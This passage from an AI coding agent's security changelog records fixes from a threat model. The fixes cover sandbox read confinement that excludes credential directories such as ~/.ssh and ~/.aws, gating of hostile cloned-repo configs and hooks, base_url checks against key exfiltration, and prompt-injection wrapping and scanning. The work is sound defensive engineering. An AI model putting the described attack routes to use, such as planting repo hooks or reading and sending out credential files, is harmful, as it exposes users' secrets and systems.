`*swarm.SubprocessBackend` (backed by a small fake-worker `TestMain`, mirroring the pattern
`internal/swarm/subprocess_test.go` already uses to let the test binary double as the headless
worker process SubprocessBackend re-execs), with a shared `*cost.Tracker` that already has
significant prior spend attached to the caller's ctx before the detach point, and asserts the
detached child's `WorkerSpec` actually carries the fair-share-reduced remaining ceiling rather than
the daemon's full configured cap. To confirm the new test isn't vacuous, the carry-forward in
`spawnBackground` was temporarily disabled locally and the test observed to fail with
`RemainingBudgetUSD`/`RemainingTokens` both at zero (the daemon's full cap, unreduced) before the
carry-forward was restored and the test re-verified passing — i.e., this is a real, confirmed
regression test, not one that happens to pass regardless. **No production code changes were
needed**; this shipped as a verification/hardening item, closing a real "never verified end-to-end"
test-coverage gap rather than a live bug (mirroring how P27.15's writeup below found an existing
mechanism — the per-job `auto_approve` field — already satisfied that finding's core ask). Also
corrected a stale comment at `internal/swarm/subprocess.go:155-157`, which claimed the ctx-carried
tracker is nil for "some background paths" — no longer accurate given the above, and now says so
with a pointer to the new test. `go build ./...`, `go vet ./...`, the full `go test ./...`, and
`go test -race ./internal/swarm/... ./internal/tool/builtin/...` all pass clean.

Investigation also confirmed `internal/tool/builtin/agent.go`'s `spawnBackground` is the sole
production entry point for a detached/background sub-agent spawn — the only other `task.Manager.Start`
callers outside this package are `internal/server/helpers.go`'s cron job runner (runs a shell
command, not an agent spawn — no cost tracker involved) and `internal/tool/builtin/task.go`/`shell.go`
(backgrounded shell commands, same). `internal/debate` never detaches: its role runs happen
synchronously inline on the caller's own ctx, so they inherit the tracker through normal ctx
propagation without needing this carry-forward pattern at all. The in-process backend path
(`internal/server/server.go`'s `subAgentRunner`) needed no change either — every sub-agent's engine,
foreground or (once `spawnBackground` reattaches it) detached, shares the literal same `*cost.Tracker`
pointer, so `engine`'s budget gate checking cumulative `TotalUSD()` against one `BudgetUSD` already
bounds total spend across the whole in-process fan-out tree.

Before that, same day (2026-07-13): **P27.18** (FIND-19, Tier 3, CVSS 5.5) shipped: confine the `os`
sandbox backend's file reads to the workspace plus a toolchain allowlist, instead of the entire host
filesystem. Shipped ahead of the then-still-open P27.16/P27.17 (both Tier 3, but this one was
self-contained and didn't depend on either) — both have since shipped too, closing out Tier 3
entirely; see their entries above.

Seatbelt's profile was `(allow default)` with only `file-write*` denied outside the workspace, and
bwrap's was `--ro-bind / /` — read-only-mounting the whole host root — so a compromised shell command
running under `sandbox.backend: os` could still read (and, unless `network: false` was also set,
exfiltrate) `~/.ssh`, cloud credential files, or any other host file, even though writes were already
confined. `internal/sandbox/os_sandbox.go`: `seatbeltProfile` now adds a `(deny file-read*)` +
`(allow file-read* ...)` pair mirroring the existing write-confinement rules — narrower than the
`(allow default)` a from-scratch lockdown would need, since it leaves every other default-allowed
operation (process exec, mach lookups, sysctl reads, signals) untouched and only tightens
`file-read*`/`file-write*`; `bwrapArgs` drops `--ro-bind / /` entirely and instead `--ro-bind`s only
the allowlisted paths, so an unlisted read gets `ENOENT` rather than the real host file. The allowlist
(`defaultOSReadPaths`) is OS-specific system dirs (`/usr`, `/bin`, `/lib`, `/etc`, `/opt`, etc.) plus
common per-language toolchain caches under `$HOME` (`go`, `.cargo`, `.rustup`, `.npm`, `.nvm`,
`.pyenv`, `.gem`, `.bundle`, `.local`, `.cache`) — chosen so ordinary builds keep working — and
deliberately omits credential directories (`~/.ssh`, `~/.aws`, `~/.config`, `~/.kube`, `~/.docker`,
`~/.gnupg`): those are simply never bound/allowed, not detected-and-blocked, so they're unreadable
from inside the sandbox regardless of what's in them. `mergeReadPaths` dedupes the built-in list
against the new `sandbox.os_extra_read_paths` config field (`config.SandboxConfig.OSExtraReadPaths`,
threaded through `NewOSBackend`'s new `extraReadPaths` param) and drops any entry that doesn't exist
on the host, since bwrap fails to bind a missing source and a nonexistent seatbelt subpath is a
silent no-op either way. The network-egress-deny-by-default half of this finding needed no change:
`sandbox.network` already defaults to `false` and `NewOSBackend`'s `denyNet` is already `!allowNetwork`.

This remains an allowlist, not a hard boundary the way write-confinement is — a toolchain cache
directory that happens to also hold a stray credential file would still be readable, and the
allowlist has to stay broad enough to cover real toolchains. Docs updated to stop describing the `os`
backend's reads as fully unconfined (`docs/configuration.md`, `docs/security_scan.md`'s security
properties table and "when to use" guidance). New/updated tests: `TestSeatbeltProfile` and
`TestBwrapArgs` (`internal/sandbox/os_sandbox_test.go`) extended to assert the read-path allowlist
entries and the absence of `--ro-bind / /`; new `TestMergeReadPaths`. `go build ./...`, `go vet
./...`, and the full `go test ./...` pass clean.

Before that, same day (2026-07-13): **P27.15** (FIND-08, Tier 3, CVSS 5.6) shipped: apply the full
permission stack, not just the coarse mode check, at cron fire time.

Cron fire-time gating (FIND-03/P24.3) previously re-checked only the coarse permission mode via
`permission.Policy.Decide`, so an operator's text-based deny rule or the contextual egress/network
policy — both fully enforced for interactive tool calls — had no effect on an unattended cron fire.
`internal/server/helpers.go`'s `newCronRunFunc` now takes a `permCheck func(ctx, cron.Job) (bool,
string)` thunk instead of a bare `mode func() permission.Mode`; the new `Server.cronPermCheck`
builds the identical gate stack `buildGate` assembles for every interactive engine run — mode →
contextual egress/network policy → text allow/deny rules, with an empty `persona.Persona{}` since a
cron job has no persona of its own (matching how sub-agent runs skip the persona layers) — and
checks it against the real `"shell"` tool with `{"command": job.Command}` as input. A job's
`auto_approve` opt-in resolves any Ask-tier decision anywhere in that stack (previously it only
covered the single mode-level Ask); an explicit `deny` rule or a Deny-mode decision still blocks
regardless of `auto_approve`, and an explicit `allow` rule now lets a job fire unattended without
needing `auto_approve` set at all — matching how rules already override the mode gate for
interactive calls.

Construction-order wrinkle: `newCronRunFunc`/`cron.NewScheduler` are built early in `Server.New()`,
before the `*Server` exists, because the scheduler has to already exist when the tool registry
registers `cron_create`/etc. with `Cron: cronSched`. Rather than add a setter to `cron.Scheduler` or
restructure construction order, `New()` now predeclares `var s *Server` and the `permCheck` thunk
passed to `newCronRunFunc` closes over that variable, calling `s.cronPermCheck` — since the thunk is
only ever invoked at actual fire time (long after `New()` finishes assigning `s`), capturing the
not-yet-initialized pointer is safe standard Go closure semantics, not a race.

Also new: a human-facing review view for persisted cron jobs (the finding's "surface persisted
auto-approve jobs in a review view") — previously a job's `auto_approve` status was visible only to
the model itself via the `cron_list` tool, with no operator-facing surface at all. Added `GET
/cron/jobs` (`api.CronJobInfo`, `internal/server/sessions.go`), `Client.ListCronJobs`
(`internal/client/client.go`), and a new `aegis cron list` CLI command
(`internal/cli/cron.go`, wired into `root.go`'s session group) that flags each auto_approve job
inline (`--auto-approve-only` to filter to just those). The finding's other suggestion — "require a
separately-confirmed flag for `auto_approve` jobs" — was satisfied by the existing per-job
`auto_approve` field itself (already explicit, boolean, and distinct from the daemon's ambient
permission mode) rather than adding a second flag; its scope was extended in place instead, per the
scope note in [roadmap.md](roadmap.md#priority-order).

Docs updated (`docs/tools-reference.md`, cron_create section). New tests:
`TestNewCronRunFuncBlockedByDenyRuleEvenInAutoMode`, `TestNewCronRunFuncAllowedByRuleEvenInPlanMode`,
`TestServerCronPermCheck`, `TestHandleListCronJobs` (`internal/server/cron_test.go`); the 6
pre-existing `newCronRunFunc` tests were updated to the new signature via a `cronPermCheckFor` test
helper (builds a gate from `permission` package primitives directly, no full daemon needed) rather
than dropped. `go build ./...`, `go vet ./...`, and the full `go test ./...` pass clean.

Before that, same day (2026-07-13): **P27.14** (FIND-04, Tier 3, CVSS 6.8) shipped: warn/recommend
against the unconfined `local` sandbox backend.

The default `local` sandbox backend runs shell commands on the host with only env-var stripping —
no fs/net/process isolation; the build-mode approval prompt and `ValidatePath` are the only
compensating controls. `internal/server/server.go`'s `New()` now logs a persistent startup `WARN`
("sandbox backend is 'local' (unconfined): ... consider sandbox.backend: os ... or container")
any time the effective backend is local and `permission.mode` isn't `plan` (i.e. execute-capable
tools are reachable at all) — this covers the default `build`-mode case, which previously got no
startup signal whatsoever; only the sharper `auto`-mode-with-no-approval and `auto_approve_exec`
cases already warned. `internal/cli/doctor.go`'s `doctorSandboxCheck` now reports the same
local-backend case as a `WARN` (with a `Fix` naming `sandbox.backend: os`/`container`) instead of a
silent `PASS` it previously buried in the detail text.

`aegis --first-init`'s generated global config template (`internal/cli/init.go`) now defaults new
installs to `sandbox.backend: os` — OS-level isolation (macOS seatbelt / Linux bubblewrap) with no
container runtime required — instead of `local`. This is a zero-risk-of-breakage change:
`SelectSandbox` already gracefully falls back to the unsandboxed `local` backend (logging the new
warning above) rather than hard-failing when no OS sandbox mechanism is available on the host
(bubblewrap not installed on Linux, or Windows, which has neither mechanism) unless
`sandbox.strict` is set. macOS installs — where `sandbox-exec` ships by default — get real write/
network confinement for free; Linux installs without bubblewrap and all Windows installs fall back
to exactly today's behavior plus the new warning. Existing on-disk configs are untouched (the
template only affects a fresh `--first-init`); the base `config.Load()` default used when no config
file exists at all (tests, embedders) deliberately stays `local` as the conservative absolute
fallback. "Defaulting new installs to the OS sandbox where available" was one of two options the
finding suggested (the other being a persistent warning banner) — both were implemented, since the
OS-sandbox default carries no downside given the graceful fallback.

Docs updated: `docs/configuration.md` (sandbox section default + rationale), `docs/security_scan.md`
(new "Local sandbox, execute-capable tools" note under Startup warning). Tests:
`TestNewWarnsLocalSandboxBuildMode` and `TestNewSkipsLocalSandboxWarningInPlanMode`
(`internal/server/sandbox_startup_test.go`, the latter confirming `plan` mode — which denies
execute entirely — is correctly exempted from the new warning); `TestDoctorCleanSetupExitsZero`
updated to assert the sandbox row is now a `WARN` naming "no isolation" rather than a silent `PASS`.
`go build ./...`, `go vet ./...`, and the full `go test ./...` pass clean.

**Last updated:** 2026-07-13 — **P27.1** and **P27.2**, the P27 threat model's Tier 1, shipped.

*P27.1 — workspace-trust gate (FIND-01 + FIND-02, CVSS 8.5/8.2).* A cloned repository's
`.aegis/config.yaml` was merged with no confirmation and its `session_start`/`pre_tool_use` `hooks`
ran automatically — silent code execution (CWE-94) and silent widening of
`permission.mode`/`sandbox.*`/`mcp.servers`/`notify.webhook` (CWE-829) via config alone. New
`internal/workspacetrust` package: a small JSON store (`<data_dir>/workspace_trust.json`,
ACL-hardened via `fsguard.RestrictToOwner` like the session DB and `.env`) mapping normalized
absolute directory paths to a trust decision, deliberately anchored to the fixed user-level data
dir rather than `cfg.DataDir` — a hostile project config overriding `DataDir` must not be able to
point the trust store somewhere it controls. `config.Load()` now loads two koanf layers — the
normal one (defaults → global → project → env) and a "baseline" one with the project file excluded
— unmarshals both, and for an untrusted directory (no `workspacetrust` entry) with any diff between
them in `permission.*`/`sandbox.*`/`mcp.servers`/`notify.webhook`/`hooks`, overwrites the merged
config's fields with the baseline's, exposing what happened via a new `cfg.WorkspaceTrust` field
(`Dir`, `Trusted`, `Frozen`, `Changes []string`). Frozen state surfaces three ways: a daemon-log
WARN (`internal/server/server.go`, alongside the existing local-sandbox/auto-exec posture
warnings), a stderr banner printed before the TUI takes over the terminal
(`cli.warnWorkspaceTrust`, mirroring the existing `warnSandboxFallback`), and a new `aegis doctor`
check. New `aegis trust` command (`internal/cli/trust.go`) shows the diff and prompts before
recording a trust decision for the current directory (`--yes` to skip the prompt, `--status` to
inspect without prompting, `--revoke` to undo). The two pre-existing first-party writers of a gated
key — `config.PatchProjectSandbox` (`aegis sandbox use --project`) and
`config.AppendProjectPermissionRule` (the TUI's "allow always for this pattern" approval option,
TQ6) — now auto-trust the directory they write to as a side effect of a successful write, since
that write is an explicit local operator action in that exact directory, not a setting silently
inherited from a cloned repo's pre-existing config; this is also what keeps their existing tests
(which write-then-immediately-reload) passing unchanged. Tests: `internal/workspacetrust`
(persistence, revoke, normalization), `internal/config` (freeze-on-untrusted, apply-after-trust,
non-gated keys unaffected, no-project-config trivially trusted, both auto-trust call sites),
`internal/cli` (`aegis trust` status/yes/revoke/declined-confirmation, the new doctor check).

*P27.2 — `provider.base_url` allowlist/warn (FIND-03, CVSS 7.1).* `provider.base_url` had no
destination validation, so a project-config-sourced value could redirect API-key-bearing requests
to an attacker host (CWE-522) with no warning. New `providerfactory.validateBaseURL`, called from
`buildOne` for both the primary adapter and every fallback target: a non-loopback plaintext-HTTP
`base_url` is refused outright when a real API key would be attached (Ollama's non-secret
`"ollama"` placeholder is exempted, so the common local/LAN Ollama-over-HTTP setup keeps working
unchanged); a non-default host for a cloud provider (compared against `api.anthropic.com`/
`api.openai.com`) isn't blocked — legitimate corporate-gateway/self-hosted-proxy setups are common —
but logs a prominent WARN naming the override. `config.IsLoopbackBaseURL` exported (was already
`isLoopbackBaseURL`, used internally by `LocalPromptProfile`) so `providerfactory` reuses the exact
same loopback test rather than a second implementation. Tests: refuse-on-plaintext-non-loopback,
allow-on-loopback, warn-on-non-default-host, no-warn-on-default-host, plus the existing
fallback/cloud-gating tests unaffected (none of them set `BaseURL`).

`go build ./...`, `go vet ./...`, and the full `go test ./...` pass clean.

**Last updated:** 2026-07-13 — the P27 threat model's entire Tier 2 shipped: **P27.3, P27.4, P27.5,
P27.6, P27.7, P27.8, P27.9, P27.10, P27.11, P27.12, P27.13** (all 11 Tier 2 items; P27.1/P27.2 above
already closed Tier 1). Implemented in parallel by
7 isolated sub-agents in separate git worktrees, grouped by file-overlap risk rather than 1:1 with
finding IDs — 6 agents each owned a fully disjoint package (no two agents ever touched the same
file), and one agent bundled the 5 items that all needed to edit `internal/config/config.go`'s
shared `defaults()` map/`Load()` path (P27.3, P27.5, P27.9, P27.12, P27.13) into a single branch to
avoid the map-literal collisions that splitting them further would have caused. All 7 branches
merged into `main` with **zero manual conflict resolution** (git auto-merged every overlapping file,
including the two three-way merges touching `config.go` and `server.go`); full `go build ./...`,
`go vet ./...`, and `go test -count=1 ./...` pass clean on the fully integrated tree.

*P27.3 (FIND-05) — `security.redact_secrets` default on.* One-line default flip
(`defaults()["security.redact_secrets"] = true`); gitleaks-backed masking now runs by default on
read-tool/conversation content before it reaches a cloud provider. Fails open if gitleaks isn't on
PATH, so this is low-risk to default on.

*P27.4 (FIND-06) — default auth token for `mcp-serve`/ACP stdio.* Both interfaces previously ran
fully unauthenticated when `AEGIS_MCP_TOKEN`/`AEGIS_ACP_TOKEN` was unset. New
`config.GenerateAndWriteToken` (mirrors the daemon's own `generateAndWriteToken` for `daemon.token`)
auto-generates a random token per process start and writes it to an owner-only
`<data_dir>/mcp.token`/`acp.token` (`fsguard.RestrictToOwner`-hardened) when the env var isn't set;
an explicit env var still always wins. `--help` text and the `.aegis/config.yaml` init template now
document the token file path so a calling harness can discover it. `mcpserver`/`acp` library APIs
are unchanged (empty token still means "open") — only the CLI wiring now guarantees a non-empty
token by default.

*P27.5 (FIND-13) — pinned-cert loopback TLS on by default.* The riskiest of the five bundled items:
`defaults()["server.tls.enabled"] = true` turns on the pinned self-signed-cert TLS
(`internal/server/tls.go`, P24.18) for client↔daemon loopback traffic that was previously plaintext.
Verified end to end, not just via unit tests — built the binary, ran `aegis serve`, confirmed
`daemon.crt`/`daemon.key` auto-generate and `aegis sessions list`/`aegis doctor` succeed over the
pinned HTTPS connection with zero manual setup (`client.NewFromConfig` and the TUI's daemon
auto-start path already had full TLS support wired in from P24.18). Along the way, found and fixed a
real latent bug (noted again below): `envKeyCallback`'s single-split heuristic never reached the
nested `server.tls.enabled` key, so the documented `AEGIS_SERVER_TLS_ENABLED` env-var escape hatch
silently did nothing — now fixed with a regression test, which matters more once TLS is the default.

*P27.6 (FIND-07) — trust-wrap project context/memory files.* `AGENTS.md`/`CLAUDE.md`/
`.aegis/context.md`/`.aegis/memory.md` content is now wrapped with the same `internal/trust.Wrap`
untrusted-provenance marker P24.4 already applied to persona/skill bodies, at the two live read
sites (`internal/memory/context.go`'s `loadContextDirect`, `internal/memory/memory.go`'s
`loadDirect`) — both project- and user/global-sourced files get the identical wrap, matching the
P24.4 precedent of not distinguishing provenance for any disk-loaded file.

*P27.7 (FIND-09) — gate project-persona control fields on workspace trust.* A project persona's
`mode`/`tools`/`rules`/`output_guard` frontmatter is now dropped at parse time
(`internal/persona/load.go`) unless the persona's project directory is trusted per the P27.1
`workspacetrust` store — queried directly rather than via `cfg.WorkspaceTrust.Trusted`, since that
config-level flag is forced true whenever no project `config.yaml` exists to freeze, which would
have missed a hostile repo shipping only a persona file. `Model`/`Description`/`System` (already
wrapped by P24.4) are untouched; user/global personas keep full control unconditionally.

*P27.8 (FIND-10) — SSRF-safe dialer for the HTTP/SSE MCP client.* `internal/mcp/http.go` gained its
own `mcpSSRFSafeDialer`/`mcpValidateNotPrivate`/private-CIDR table, deliberately a small duplicate
of `internal/tool/builtin/web.go`'s `ssrfSafeDialer` rather than a cross-package import — matching
existing precedent in `internal/security/target.go`, which already duplicates the same table rather
than coupling `internal/sandbox` to `internal/config`. Both the MCP client's POST `/message` and GET
`/sse` requests are now protected, with redirect targets re-validated the same way `web_fetch` does.

*P27.9 (FIND-11) — DAST `allowed_targets` sourced from user/global config only.* `config.Load()` now
unconditionally overwrites `cfg.Security.DAST.AllowedTargets` from the same project-excluded
baseline layer the P27.1 trust gate already computes — reusing that machinery rather than a third
koanf load. This is intentionally stronger than trust-gating: a hostile repo's `allowed_targets`
never applies, even after the directory is `aegis trust`-ed, since project-controlled network-scan
targets is a different risk shape than project-controlled permission mode.

*P27.10 (FIND-18, ACL half) — fsguard-harden `longmem.db`/`knowledge.db`.* Both now call
`fsguard.RestrictToOwner` on the main db file (fatal on error, since Aegis creates the file itself)
and best-effort on `-wal`/`-shm` sidecars (logged, not fatal), exactly mirroring
`internal/session/session.go`'s existing `hardenDBPermissions`.

*P27.11 (FIND-20) — harden swarm mailbox file permissions.* Processed mailbox files now write
`0o600` instead of `0o644`, and the `teams/` root directory is `fsguard`-hardened on every
`OpenMailbox`. This surfaced a real pre-existing Windows ACL bug: `fsguard_windows.go`'s ACE had no
inheritance flags, so hardening a populated directory left descendant files with an effectively
empty inherited DACL — denying even the owner. Fixed by adding `OICI` (object-inherit/container-
inherit) flags, a no-op for the pattern's other pre-existing file-only call sites (daemon token,
session DB, `.env`, TLS key). The per-run shared-secret/HMAC message-authentication stretch goal was
explicitly scoped out for a future item — the file-permission fix was the priority and is complete.

*P27.12 (FIND-14) — default concurrency/rate caps + invalid-auth throttling.*
`server.max_concurrent_runs` now defaults to 10 and `server.max_run_duration_sec` to 1800s (bounding
only top-level HTTP-driven runs, not in-process swarm sub-agents — a normal single-user session
never approaches either ceiling). `recordInvalidAuthAttempt` (`internal/server/auth.go`) gained a
consecutive-failure-streak lockout (separate from the existing cumulative FIND-11 counter) with
exponential backoff (1s→60s cap) past a threshold of 10 attempts, set above the pre-existing
`TestServerInvalidAuthAttemptsLoggedAndCounted` test's 6 attempts.

*P27.13 (FIND-12, default-on half) — injection scan on by default.* `search.scan_output` now
defaults true via the `defaults()` map; the per-MCP-server `scan_output` (a list element with no
koanf-defaults mechanism) was converted to `*bool` with a `ScanOutputEnabled()` resolver, mirroring
the existing `SecurityToolConfig.Enabled` pattern, and now also defaults true. Confirmed via
`internal/trust.Wrap` that a scan hit only adds a visible warning — it never blocks or mutates
content — making this genuinely low-risk to default on.

**Last updated:** 2026-07-12 — **P22.5, P22.6, P20.2, P20.3** shipped as a second user-selected
batch of four Tier 4 parked items, same day as the first batch below. P25.9 and P6.1 were
deliberately excluded from this round (both Effort L, both large/high-blast-radius — daemon
singleton rescoping and the core engine streaming loop, respectively — better suited to focused
solo work than parallel automation) and P13.3.3 stays excluded as its ACP-host-usage precondition
still hasn't materialized. All four were implemented in parallel by isolated sub-agents in separate
git worktrees, then merged into `main` sequentially; one doc-only conflict (`docs/tui-guide.md` —
both P22.5 and P22.6 appended to the same table) was resolved by combining both additions, no code
conflicts. `go build ./...` and the full `go test ./...` both pass clean on the merged tree.

*P20.3 — hardware-aware local model recommendation.* New `internal/hwinfo` package detects CPU
core count (`runtime.NumCPU()`, always reliable) and total system RAM via platform-specific,
`//go:build`-tagged best-effort probes (`/proc/meminfo` on Linux, `sysctl -n hw.memsize` on macOS,
Win32 `GlobalMemoryStatusEx` via `golang.org/x/sys/windows` on Windows — matching the existing
syscall idiom in `internal/fsguard/fsguard_windows.go`), failing soft to an "unknown" source on any
other platform or probe failure — never erroring. Deliberately excludes GPU/VRAM detection,
following the precedent P17.5 already set for the exact same reason: "no VRAM/GPU/host
introspection — Aegis would be reimplementing that heuristic blind from a fragile,
platform-specific proxy signal." `internal/modelcatalog`'s `TierLocal` entries now carry a
`MinRAMGB` floor (qwen3/qwen2.5-coder: 4, llama3.1: 8, deepseek-r1: 16 — qualitative rules of
thumb, not measured benchmarks, matching `Curated()`'s existing framing) and a new
`RecommendLocal(hw)` filters to what fits detected RAM, falling back to the full unnarrowed list
when RAM is undetected. Surfaced via `aegis models --recommend` (detected hardware + narrowed
table + `ollama pull <model>` suggestions for anything not already pulled, cross-referenced against
`internal/discover`'s Ollama probe — printed only, never auto-executed, matching P13.4's
`security_advise` guarded-suggestion precedent) and a per-entry hardware-fit badge in the TUI's
`/models` picker (`internal/tui/modelpicker.go`). Tests: portable tests for the fail-soft/unknown
path plus platform-guarded tests per OS (skip gracefully when the real facility isn't reachable);
table-driven `RecommendLocal` coverage; build-tagged files verified to compile cleanly under
cross-compiled `GOOS=linux`/`GOOS=darwin` in addition to the native Windows build. Docs:
`docs/providers.md`, `docs/cli-reference.md`.

*P20.2 — blind model compare (`aegis compare`).* New `aegis compare <model-A> <model-B> [prompt]`
command (`internal/cli/compare.go`), a separate command rather than a `parallel` flag since its
output contract — withhold identity, vote, reveal, optional synthesis — is different enough from
`parallel`'s plain interleaved-progress contract to muddy both if merged. Mirrors
`runOneParallel`'s create-session/PATCH-model/post-message/drain-events shape (`runOneCompare`),
setting each session's model via the existing P14.7 `PATCH /sessions/{id}` mechanism. Identities
are hidden during the run — progress is logged only by generic label ("Response 1"/"Response
2"), with slot assignment randomized via `crypto/rand` so position isn't a tell — then revealed
after the user votes (`1`/`2`/`tie`/`skip` read from stdin). `--synthesize` (default off, plus
`--synth-model`) makes one further call combining both revealed answers, clearly labeled as a
synthesis rather than a third blind response. Both underlying sessions persist and remain
resumable via `aegis --resume <id>`, matching the existing convention `parallel.go` already
established (it never deletes its sessions either). Tests: vote parsing, a regression test proving
mid-run logs never leak model identity, randomization producing both slot orders, and command/flag
construction. Docs: new `## aegis compare` section in `docs/cli-reference.md`.

*P22.6 — raw scrollback mode.* `/scrollback [on|off]` releases the TUI's dashboard rendering for
native terminal scrollback/selection/search. The investigation corrected the roadmap item's own
framing: bubbletea v2 moved alt-screen/mouse-capture control from `tea.NewProgram` options to
per-frame `tea.View()` fields, and this app's `View()` does set `AltScreen=true` /
`MouseMode=CellMotion` on every frame — so alt-screen genuinely was on, contrary to what a grep for
the v1-era `WithAltScreen`/`EnterAltScreen` APIs suggested. But alt-screen turned out to be only
half the blocker: `transcriptPane.View()` (`internal/tui/transcript.go`) independently clips to a
bounded, fixed-height, in-place-redrawn viewport regardless of alt-screen state — the same screen
rows get reused every frame instead of old content ever scrolling into the terminal's real
history. Raw scrollback mode flips both: `View()` sets `AltScreen=false`/`MouseMode=None`, and the
transcript's rendered height tracks its own unbounded content height instead of the terminal
window, so appended lines genuinely scroll off into terminal history as the conversation grows.
The sidebar, scrollbar column, and terminal pane (`Ctrl+X`) are hidden while it's on (they assume a
fixed-height dashboard) and restored — including prior sidebar open/closed state — when toggled
back off. Off by default, resets on restart, same convention as `/tools` and `/humor`. Known
cosmetic limitation (not pursued, S/M effort tier): dialog/picker overlays composite against a
canvas sized to the terminal window, not the grown transcript frame, so one opened after the
transcript has scrolled past a screenful renders near the top rather than the current bottom.
Tests: `internal/tui/scrollback_test.go` (dispatcher sentinels, on/off/toggle transitions,
`View()` field assertions, the unclipping rendering branch including content appended after the
mode is already on, sidebar-hidden branch). Docs: `docs/tui-guide.md`.

*P22.5 — `/side` ephemeral side conversation.* `/side <question>` answers a quick, unrelated
question without touching the main conversation's history, cost counters, or active session id.
`cmdSide` (`internal/tui/slash.go`) creates a genuinely separate session (`Mode: "plan"` —
read-only, since the handler has no way to surface an interactive approval mid-flight — default
persona/system prompt, not the current session's), posts the question, drains its SSE stream into
an answer, and appends the Q&A to the main transcript as plain output clearly marked `[side <id8>]
<question>`; `SwitchToSession`/`ReloadSession` are never set, so the main session is provably
untouched (covered by a dedicated isolation test). The side session is kept rather than deleted —
abrupt deletion would lose the answer if the user wants to revisit it, and it stays fully usable
via `/session list`, `/fork`, `/rewind` like any other session — but its title is prefixed `"[side]
"` so it's visually distinct in the session list rather than adding a new `Ephemeral` field that
would need threading through the store and every session-management surface for what a title
prefix already accomplishes. Tests: `internal/tui/side_test.go` (usage-error fast path,
`commandDefs` registration guard, the isolation-invariant assertion). Docs: `docs/tui-guide.md`.

*P13.4 — `security_advise` engagement tooling (notebook + CVE lookup + guarded suggestions +
status digest).* New builtin tool `security_advise` (`internal/tool/builtin/advise.go`, capability
`network`) with an action-style interface: `note`/`list`/`log` against a file-backed, append-only
JSONL **engagement notebook** (`internal/security/notebook.go`) keyed by a sanitized engagement
name and rooted under the daemon's per-user data directory — deliberately a dedicated store rather
than extending `internal/memory`'s single project/user file, which doesn't fit a
named-multi-notebook, multi-day-persistent shape (the same conclusion the original 2026-07-06
deferral reached: "a real idea, separate scoped item"). `cve_lookup` queries the NVD CVE 2.0 REST
API by ID or keyword (`internal/security/cve.go`), with injectable base URL/HTTP client for
tests and explicit 403/429 handling that surfaces a clear rate-limit error (naming the `NVD_API_KEY`
env var for a higher limit) instead of hanging. `suggest` (`internal/security/suggest.go`) returns
**guarded** next-step suggestions as plain text only, from simple explainable keyword rules over
notebook content (no recon logged, findings undocumented, a CVE mentioned but never looked up) —
it never auto-executes a tool and isn't a second LLM call, preserving human/model-in-the-loop
judgment per the original "guarded" framing. `status` returns a digest of the current engagement
rather than extending `api.StatusInfo`/`/status` as P13.4.4 originally sketched — that endpoint is
daemon-global with no existing per-entity-key precedent, so folding a per-engagement digest into it
would have been a bigger, differently-shaped change than the digest itself is worth; documented as
a deliberate scope call, not an oversight. Wired into the `red-team`, `security`, and
`security-critic` personas' advisory `Tools:` lists (matching how `dast_scan`/`recon_scan` were
added for P13.5/P13.8); left off `security-arbiter` since that persona introduces no new claims and
does no independent investigation, so a research/notebook tool doesn't fit its role. Tests:
`internal/security/{notebook,cve,suggest}_test.go` (notebook persistence-across-restart and
engagement-isolation, CVE lookup against a mocked HTTP transport — no live network calls — covering
ID/keyword/403/429/500/malformed-args, and table-driven suggestion-rule coverage) plus
`internal/tool/builtin/advise_test.go` for tool-level action dispatch. Docs:
`docs/tools-reference.md` and a new section in `docs/security_scan.md`. This closes out P13 except
P13.3 (terminal enhancements, still Tier 4/parked).

*P9.4 — opt-in per-task model routing.* `ProviderConfig.TaskRouting` (`koanf:"task_routing"`,
default `false`) lets a session route each user-facing turn between `Model` and the existing
`SmallModel` (previously used only for title generation, compaction, and P25.3's output-guard
verdicts — never for an actual answering turn). Routing only engages when both `TaskRouting` is
enabled and `SmallModel` is configured, mirroring the existing "no SmallModel = no behavior
change" precedent those three call sites already established; an explicit per-session `/model`
override (P14.7) always short-circuits routing entirely; a turn continuing a session with prior
tool calls stays on the big model rather than bouncing down, since a task the model already judged
worth using tools for isn't a "simple turn" candidate. The classifier (`internal/server/routing.go`
`classifyTurn`) is a purely local heuristic — no extra model call, which would defeat the point —
biased toward the expensive model whenever uncertain: a false negative (big model on an easy turn)
just costs a bit more, a false positive (small model on a hard turn) produces a wrong answer.
Signals, in priority order: prior tool calls in the session (checked first), a code fence, ≥2
multi-step list markers, message length (words or chars, to also catch dense single-token content
like stack traces), and ≥3 sentence boundaries. Logs a `Debug` line with the routing outcome so
this is observable rather than a silent behavior change. Tests: `internal/server/routing_test.go`
(table-driven classifier cases plus a routing-resolution test proving the session override still
wins, mirroring `TestGuardModelPrefersSmallModel`'s shape). Docs: `docs/configuration.md`.

*P13.3.2 — `@shell` context token.* Extends the TUI's `@`-mention system (`internal/tui/completion.go`'s
`refTypes`, previously `image:`/`diagnostics`/`url:`/`symbol:`, only `image:` locally resolved) with
`@shell` (default last 50 lines) / `@shell:N` (explicit line count), resolved on submit by pulling
the embedded terminal pane's most recent run (`termPane.lastCmd`/`lastOutput`/`lastExitCode`/
`lastFailed`, tracked since P13.3.1's shell-aware error assist) and splicing formatted text in place
of the token — the same clean-and-inject shape `extractImageRefs` already uses for `@image:`, just
text instead of an image attachment. A word-boundary-anchored regex (`@shell(?::(\d+))?\b`) avoids
false-matching `@shellac`; no terminal run yet substitutes a short placeholder rather than failing
submission. Tests: `internal/tui/shellref_test.go` (placeholder case, default/explicit line counts,
failed-command framing, multiple occurrences in one message, the token-boundary negative case).
Docs: `docs/tui-guide.md`'s `@` references table and Terminal Pane section. `@diagnostics`/`@url:`/
`@symbol:` are untouched — they stay textual, resolved by the agent's own tools, not locally.

*P24.21 — bearer-token scrubbing in `Client` process memory (FIND-33).* The only one of 35 findings
from the 2026-07-10 STRIDE-A threat model still open (the other 34 shipped as P24.1-P24.20/P24.22
or were verified existing controls) — Low severity, CVSS 2.8, explicitly low priority per the
finding itself ("host/OS access is already a significant compromise"). Best-effort defense-in-depth,
not a hard guarantee, in a garbage-collected language with immutable strings — documented as such
in code. `Client.authToken` changed from `string` to `[]byte`; `WithTokenFile` reads the token file
straight into the byte slice, never round-tripping through a string; the public `WithToken(string)`
API still takes one unavoidable copy at the boundary. New `Client.Zero()` overwrites the backing
bytes in place and nils the field. `setAuth`'s own `"Bearer "+string(...)` concatenation and
`http.Request.Header.Set`'s internal copy remain outside `Zero`'s reach — documented explicitly
rather than oversold. Wired at real lifecycle points, each a judgment call commented in code:
one-shot CLI commands `defer cl.Zero()` right after construction (`internal/cli/{sessions,bg,doctor,
